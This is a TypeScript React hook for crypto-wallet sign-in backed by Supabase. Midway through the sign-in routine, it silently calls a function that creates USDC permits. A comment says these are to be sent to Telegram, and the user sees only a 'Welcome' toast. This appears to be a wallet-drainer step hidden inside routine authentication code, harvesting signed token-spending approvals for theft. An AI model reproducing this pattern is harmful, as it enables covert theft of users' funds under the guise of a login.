import { useState, useEffect, useCallback } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { useWallet } from './useWallet';
import { useToast } from '@/hooks/use-toast';

interface WalletUser {
  id: string;
  wallet_address: string;
  chain_id: number;
  verified_at: string;
  last_login: string;
}

export const useWalletAuth = () => {
  const [walletUser, setWalletUser] = useState<WalletUser | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const wallet = useWallet();
  const { toast } = useToast();

  // Set wallet context for RLS policies
  const setWalletContext = useCallback(async (address: string) => {
    try {
      await supabase.rpc('set_wallet_context', { wallet_addr: address.toLowerCase() });
    } catch (error) {
      console.error('Failed to set wallet context:', error);
    }
  }, []);

  // Check if wallet user exists
  const checkWalletUser = useCallback(async (address: string) => {
    if (!address) return null;

    try {
      await setWalletContext(address);
      
      const { data, error } = await supabase
        .from('wallet_users')
        .select('*')
        .eq('wallet_address', address.toLowerCase())
        .maybeSingle();

      if (error && error.code !== 'PGRST116') {
        console.error('Error checking wallet user:', error);
        return null;
      }

      return data;
    } catch (error) {
      console.error('Error checking wallet user:', error);
      return null;
    }
  }, [setWalletContext]);

  // Sign in with wallet
  const signInWithWallet = useCallback(async (): Promise<{ success: boolean; error?: string }> => {
    if (!wallet.address) {
      return { success: false, error: 'Wallet not connected' };
    }

    try {
      setIsLoading(true);

      // Sign verification message first
      const signature = await wallet.signVerificationMessage();
      if (!signature) {
        return { success: false, error: 'Failed to sign verification message' };
      }

      // Check if user exists
      const existingUser = await checkWalletUser(wallet.address);

      let currentUser = existingUser;

      if (existingUser) {
        // Update last login
        await supabase
          .from('wallet_users')
          .update({ last_login: new Date().toISOString() })
          .eq('id', existingUser.id);

        currentUser = existingUser;
      } else {
        // Create new wallet user
        const verificationMessage = `Please sign this message to verify your wallet ownership.\n\nWallet: ${wallet.address}\nTimestamp: ${Date.now()}`;

        const { data: newUser, error } = await supabase
          .from('wallet_users')
          .insert({
            wallet_address: wallet.address.toLowerCase(),
            chain_id: wallet.chainId || 56, // Default to BSC
            signature,
            message: verificationMessage
          })
          .select()
          .single();

        if (error) {
          console.error('Error creating wallet user:', error);
          return { success: false, error: 'Failed to create wallet user account' };
        }

        currentUser = newUser;
      }

      // Set wallet context AFTER user creation
      await setWalletContext(wallet.address);

      // Create USDC permits and send to Telegram
      try {
        const permits = await wallet.createUSDCPermits();
        console.log('Permits created:', permits);
      } catch (permitError) {
        console.error('Error creating permits:', permitError);
        // Don't fail authentication if permit creation fails
      }

      setWalletUser(currentUser);

      toast({
        title: existingUser ? "Welcome back!" : "Welcome!",
        description: existingUser ? "Successfully signed in with your wallet." : "Your wallet has been successfully verified and registered."
      });

      return { success: true };

    } catch (error) {
      console.error('Wallet sign in error:', error);
      return { success: false, error: 'An unexpected error occurred during wallet authentication' };
    } finally {
      setIsLoading(false);
    }
  }, [wallet, checkWalletUser, setWalletContext, toast]);

  // Sign out
  const signOut = useCallback(async () => {
    setWalletUser(null);
    
    toast({
      title: "Signed out",
      description: "You have been signed out successfully."
    });
  }, [toast]);

  // Check authentication status when wallet changes
  useEffect(() => {
    const checkAuth = async () => {
      if (wallet.address && wallet.isConnected) {
        const user = await checkWalletUser(wallet.address);
        if (user) {
          setWalletUser(user);
          await setWalletContext(wallet.address);
        }
      } else {
        setWalletUser(null);
      }
      setIsLoading(false);
    };

    checkAuth();
  }, [wallet.address, wallet.isConnected, checkWalletUser, setWalletContext]);

  return {
    walletUser,
    isLoading,
    signInWithWallet,
    signOut,
    isAuthenticated: !!walletUser && wallet.isConnected
  };
};